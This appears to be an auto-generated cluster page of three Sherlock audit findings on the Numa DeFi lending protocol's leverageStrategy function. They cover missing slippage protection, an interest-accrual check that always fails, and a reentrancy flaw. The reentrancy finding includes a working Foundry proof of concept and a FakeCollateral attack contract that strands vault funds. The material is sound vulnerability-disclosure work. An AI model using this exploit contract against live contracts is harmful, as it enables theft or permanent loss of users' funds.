# Cluster -1435

**Rank:** #461  
**Count:** 6  

## Label
Failure to account for interest, reentrancy, and slippage enables attackers to manipulate debt exposure, drain funds, or disable leverage—leading to unauthorized asset loss or permanent debt exposure.

## Cluster Information
- **Total Findings:** 6

## Examples

### Example 1

**Auto Label:** Failure to account for interest, reentrancy, and slippage enables attackers to manipulate debt exposure, drain funds, or disable leverage—leading to unauthorized asset loss or permanent debt exposure.  

**Original Text Preview:**

Source: https://github.com/sherlock-audit/2024-12-numa-audit-judging/issues/182 

## Found by 
jokr

### Summary

When a user opens a leveraged position using the CNumaToken.leverageStrategy() function, there is no slippage protection to limit the price at which tokens are bought by the strategy contract. As a result, if the tokens are purchased at an unfavorable price, the user may incur more debt than expected. Additionally, the function lacks a deadline parameter to ensure that the transaction is executed within a specified timeframe. Without this parameter, if the transaction is delayed, the user has no control over the price at which the tokens are purchased, increasing their risk.

### Root Cause

In [CNumaToken.sol:193](https://github.com/sherlock-audit/2024-12-numa-audit/blob/main/Numa/contracts/lending/CNumaToken.sol#L193), there is no slippage check for the `borrowAmount`. As a result, if the tokens are purchased at a worse price than expected, the user may incur more debt than intended.

```solidity
    function leverageStrategy(
        uint _suppliedAmount, // 1O Numa 
        uint _borrowAmount, // 40 Numa -> rETH
        CNumaToken _collateral,
        uint _strategyIndex
    ) external {
    
       // ...
       
        // how much to we need to borrow to repay vault
        // @audit-issue There should slippage protection here. Otherwise user will incur more debt if tokens are swap at worst price
        uint borrowAmount = strat.getAmountIn(_borrowAmount, false);
      

        uint accountBorrowBefore = accountBorrows[msg.sender].principal;
       
        borrowInternalNoTransfer(borrowAmount, msg.sender);
   
        
        require(
            (accountBorrows[msg.sender].principal - accountBorrowBefore) ==
                borrowAmount,
            "borrow ko"
        );
        
                // swap
        EIP20Interface(underlying).approve(address(strat), borrowAmount);
        (uint collateralReceived, uint unUsedInput) = strat.swap(
            borrowAmount,
            _borrowAmount,
            false
        );


    }
   ```

The `closeLeverageStrategy` function also lacks slippage protection. 

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

Let's assume 1 Numa = 0.1 rETH.

1. The user calls `leverageStrategy(10, 40, cNuma)` to open a 5x leveraged position in Numa tokens.
2. 10 Numa will be supplied by the user, and 40 Numa will be flash-borrowed from the Numa Vault by the cReth contract.
3. These 50 Numa will be supplied as collateral to the cNuma market.
4. The cReth contract will then borrow rETH against the provided collateral (50 Numa in step 3) and exchange it for Numa to repay the 40 Numa flash loan taken in step 2.
5. The user expects to incur 4 rETH of debt (40 Numa * 0.1 rETH per Numa). However, there is no control over the price at which the swap occurs. If the swap happens at a worse price, for example, 1 Numa = 0.15 rETH, the user will incur 6 rETH of debt instead of the expected 4 rETH. This price discrepancy results in a loss for the user.



### Impact

User will incur more debt that expected due to lack of slippage check.

### PoC

_No response_

### Mitigation

Add slippage protection for `borrowAmount` in `leverageStrategy` function.


```diff
    function leverageStrategy(
        uint _suppliedAmount, // 1O Numa 
        uint _borrowAmount, // 40 Numa -> rETH
        CNumaToken _collateral,
        uint _strategyIndex
    ) external {
    
       // ...
       
        // how much to we need to borrow to repay vault
        // @audit-issue There should slippage protection here. Otherwise user will incur more debt if tokens are swap at worst price
        uint borrowAmount = strat.getAmountIn(_borrowAmount, false);
+       require(borrowAmount <= maxBorrowAmount);
      

        uint accountBorrowBefore = accountBorrows[msg.sender].principal;
       
        borrowInternalNoTransfer(borrowAmount, msg.sender);
   
        
        require(
            (accountBorrows[msg.sender].principal - accountBorrowBefore) ==
                borrowAmount,
            "borrow ko"
        );
        
                // swap
        EIP20Interface(underlying).approve(address(strat), borrowAmount);
        (uint collateralReceived, uint unUsedInput) = strat.swap(
            borrowAmount,
            _borrowAmount,
            false
        );


    }
   ```
Also add slippage protection for `closeLeverageStrategy` function.

---
### Example 2

**Auto Label:** Failure to account for interest, reentrancy, and slippage enables attackers to manipulate debt exposure, drain funds, or disable leverage—leading to unauthorized asset loss or permanent debt exposure.  

**Original Text Preview:**

Source: https://github.com/sherlock-audit/2024-12-numa-audit-judging/issues/120 

## Found by 
KupiaSec, jokr

### Summary

In the `CNumaToken.leverageStrategy()` function, after borrowing from the market using the `borrowInternalNoTransfer` function, a check is performed to ensure that the user's borrow amount changes only by `borrowAmount` using a `require` statement. However, this check will fail because the user's principal borrow amount will increase by more than `borrowAmount` due to the interest accrued on the user's borrow position.

### Root Cause

```solidity
uint accountBorrowBefore = accountBorrows[msg.sender].principal;
// Borrow but do not transfer borrowed tokens
borrowInternalNoTransfer(borrowAmount, msg.sender);
// uint accountBorrowAfter = accountBorrows[msg.sender].principal;

require(
    (accountBorrows[msg.sender].principal - accountBorrowBefore) == 
        borrowAmount,
    "borrow ko"
);
```
https://github.com/sherlock-audit/2024-12-numa-audit/blob/main/Numa/contracts/lending/CNumaToken.sol#L196-L204

The require statement above will always fail since the user's previous borrow amount accrues interest, causing the principal borrow amount to increase beyond `borrowAmount`.

Even if the global interest rate index is updated, the user's borrow position will only accrue interest when their borrow position is touched as below.

```solidity
    function borrowBalanceStoredInternal(
        address account
    ) internal view returns (uint) {
        /* Get borrowBalance and borrowIndex */
        BorrowSnapshot storage borrowSnapshot = accountBorrows[account];

        /* If borrowBalance = 0 then borrowIndex is likely also 0.
         * Rather than failing the calculation with a division by 0, we immediately return 0 in this case.
         */
        if (borrowSnapshot.principal == 0) {
            return 0;
        }

        /* Calculate new borrow balance using the interest index:
         *  recentBorrowBalance = borrower.borrowBalance * market.borrowIndex / borrower.borrowIndex
         */
        uint principalTimesIndex = borrowSnapshot.principal * borrowIndex;
        return principalTimesIndex / borrowSnapshot.interestIndex;
    }
```

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path



1. Suppose the user has an existing borrow amount of 100. Hence, `accountBorrows[msg.sender].principal = 100`.
2. The user calls the `leverageStrategy` function to borrow an additional 50 from the market.
3. During the borrowing process, interest will accrue on the existing borrow amount. For example, the principal borrow amount will increase to 150.2 (existing borrow = 100, new borrow = 50, accrued interest = 0.2).
4. The `require` statement `(accountBorrows[msg.sender].principal - accountBorrowBefore) == borrowAmount` will then fail because the principal borrow amount includes the accrued interest, making the difference greater than `borrowAmount`.


### Impact

`leverageStrategy` function will fail almost always.

### PoC

_No response_

### Mitigation

Instead of directly fetching the user's previous borrow amount from the state using `accountBorrows[msg.sender].principal`, use the `borrowBalanceStored()` function. This function accounts for accrued interest and provides the correct previous borrow balance, ensuring that the `require` statement works as intended.


```diff
- uint accountBorrowBefore = accountBorrows[msg.sender].principal;
+ uint accountBorrowBefore = borrowBalanceStored(msg.sender);
```

---
### Example 3

**Auto Label:** Failure to account for interest, reentrancy, and slippage enables attackers to manipulate debt exposure, drain funds, or disable leverage—leading to unauthorized asset loss or permanent debt exposure.  

**Original Text Preview:**

Source: https://github.com/sherlock-audit/2024-12-numa-audit-judging/issues/39 

## Found by 
Vidus, jokr, juaan

### Summary

[`CNumaToken.leverageStrategy()`](https://github.com/sherlock-audit/2024-12-numa-audit/blob/ae1d7781efb4cb2c3a40c642887ddadeecabb97d/Numa/contracts/lending/CNumaToken.sol#L141) has a `_collateral` token parameter which allows an attacker to pass in a custom `_collateral` token, which acts as a wrapper around the actual collateral token, while also receiving callbacks to enable reentrancy. 

This allows the flash loan repayment to be avoided, causing a large chunk of the vault's fund to be stuck in the cNuma contract, severely dumping the NUMA price.

### Root Cause

Allowing the user to pass in the `_collateral` token enables reentrancy, allowing them to call `leverageStrategy()` again. Then when `repayLeverage()` is called in the reentrant call, the `leverageDebt` in the vault is set to `0`, even though the first call still has not repaid it's leverageDebt.

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

This exact attack is shown in the PoC. It involves a specially crafted `FakeCollateral` contract which is a wrapper around the underlying collateral, which ensures that the attack does not revert.

1. Attacker calls `cNuma.leverageStrategy()`, with `_collateral=FakeCollateral`, and a large `_borrowAmount`
2. The FakeCollateral contract re-enters the `cNuma` contract, calling `leverageStrategy()` again, with a small `_borrowAmount`
3. The reentrant call to `leverageStrategy()` finishes by calling `vault.repayLeverage()` which sets `leverageDebt` to `0`.
4. Since `leverageDebt` is equal to `0`, when it comes time for the initial `leverageStrategy()'s borrow to be repaid, none will be repaid. This causes the entire borrowed funds to be stuck in cNuma.

### Impact

Large amounts of LST can be pulled from the vault into the `CNuma` contract. This dumps the NUMA price since it depends on the ETH balance of the vault. These LSTs will be permanently lost and stuck.

### PoC

The PoC demonstrates moving 10% of the vault's funds into the cNuma contract where it can't be retrieved.

Add the foundry test to `Lending.t.sol`
```solidity
function test_reentrancy_leverageStrategy() public {
        vm.startPrank(userA);
        address[] memory t = new address[](2);
        t[0] = address(cReth);
        t[1] = address(cNuma);
        comptroller.enterMarkets(t);

        // mint cNuma so that we can borrow numa later
        uint depositAmount = 9e24;
        numa.approve(address(cNuma), depositAmount);
        cNuma.mint(depositAmount);

        // To be used as collateral to borrow NUMA
        deal(address(rEth), userA, 1e24 + providedAmount);
        rEth.approve(address(cReth), 1e24);
        cReth.mint(1e24);

        uint256 vaultRethBefore = rEth.balanceOf(address(cNuma.vault()));
        uint reth_in_cNuma = rEth.balanceOf(address(cNuma));

        rEth.approve(address(cNuma), providedAmount);

        // Setting up fake collateral token (which interacts with rETH)
        FakeCollateral fake_cReth = new FakeCollateral(address(cReth), address(rEth), userA, comptroller);

        // Sending it a tiny amount of cReth, so it can re-enter cNuma.leverageStrategy()
        cReth.transfer(address(fake_cReth), 5e10 / 2);

        // call strategy
        uint256 borrowAmount = 1e24;

        uint strategyindex = 0;
        cNuma.leverageStrategy(
            providedAmount,
            borrowAmount,
            CNumaToken(address(fake_cReth)),
            strategyindex
        );

        // check balances
        // cnuma position
        uint256 vaultRethAfter = rEth.balanceOf(address(cNuma.vault()));
        uint reth_in_cNuma_After = rEth.balanceOf(address(cNuma));
        
        // Shows that the rETH balance of the cNuma token contract has gone up by `borrowAmount` (since flash loan was not repaid)
        console.log("cNUMA rETH balance: %e->%e (stuck funds)", reth_in_cNuma, reth_in_cNuma_After);
        assertEq(reth_in_cNuma_After - reth_in_cNuma, borrowAmount);
    }
```

Also add the following attack contract to a new file `FakeCollateral.sol` in the same directory as `Lending.t.sol`
<details><summary>Attack contract</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/console.sol";
import "@openzeppelin/contracts_5.0.2/token/ERC20/ERC20.sol";

import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@uniswap/v3-core/contracts/libraries/FullMath.sol";

import "@uniswap/v3-core/contracts/libraries/FixedPoint96.sol";
import "./uniV3Interfaces/ISwapRouter.sol";

import {NumaComptroller} from "../lending/NumaComptroller.sol";

import {NumaLeverageLPSwap} from "../Test/mocks/NumaLeverageLPSwap.sol";

import "../lending/ExponentialNoError.sol";
import "../lending/INumaLeverageStrategy.sol";
import "../lending/CToken.sol";
import "../lending/CNumaToken.sol";

import {Setup} from "./utils/SetupDeployNuma_Arbitrum.sol";

import {console} from "forge-std/console.sol";
contract FakeCollateral {

    CNumaToken actualCollateral;
    ERC20 actualUnderlying;
    address public user;

    bool entered = false;
    NumaComptroller comptroller;
    constructor(address _actualCollateral, address _underlying, address _user, NumaComptroller _comptroller) {
        actualCollateral = CNumaToken(_actualCollateral);
        actualUnderlying = ERC20(actualCollateral.underlying());
        user = _user;
        comptroller = _comptroller;

        address[] memory t = new address[](1);
        t[0] = address(actualCollateral);
        comptroller.enterMarkets(t);
    }

    function underlying() external view returns(address) {
        return address(actualUnderlying);
    }

    function accrueInterest() public returns (uint) {
        return 0;
    }
    
    function mint(uint256 amt) external returns (uint) {
        actualUnderlying.transferFrom(msg.sender, address(this), amt);
        actualUnderlying.approve(address(actualCollateral), amt);

        uint256 balanceBefore = actualCollateral.balanceOf(address(this));
        actualCollateral.mint(amt);
        uint256 balanceAfter = actualCollateral.balanceOf(address(this));

        if (balanceAfter - balanceBefore > 0) {
             // transfer most of it to the user
             console.log("transferring %e cTokens to user", balanceAfter - balanceBefore - 1 wei);
            actualCollateral.transfer(user, balanceAfter - balanceBefore - 1 wei);
        }
       
        // transfer 1 wei to msg.sender to prevent revert
        actualCollateral.transfer(msg.sender, 1 wei);

    }

    function transfer(address to, uint amt) external returns(bool truth){
        // re-enter for another leverage play

        if (!entered) {
            entered = true;

            CNumaToken(msg.sender).leverageStrategy(0, 1e15, CNumaToken(address(this)), 0);
            return true;
        }
        return true;
    }

    function balanceOf(address addy) public view returns(uint) {
        return actualCollateral.balanceOf(addy);
    }
    

}
```
</details>

### Mitigation

_No response_

---
